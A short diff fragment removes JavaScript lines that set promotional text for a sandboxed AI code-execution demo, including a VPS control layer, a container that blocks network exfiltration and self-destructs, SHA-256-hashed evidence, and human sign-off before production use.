-        document.getElementById('sc2-text').innerText = '"Our control layer runs on a hardened Vultr VPS in São Paulo over private AF_UNIX sockets. We utilize Vultr Serverless Inference running Qwen 3.8-Flash-Next at just $0.000259 per execution under strict cost ceilings."';
-        document.getElementById('sc3-text').innerText = '"Watch the containment moment: an attempted exfiltration is blocked by the kernel namespace (--network none), secrets are stripped, and the container auto-destroys immediately with 0 containers remaining."';
-        document.getElementById('sc4-text').innerText = '"All evidence is hashed with SHA-256 and published to our Cloudflare Pages surface. Adopting the code into production remains an independent human decision."';
-      }
-    }
-
-    loadManifest('binding');
   </script>
 </body>
 </html>
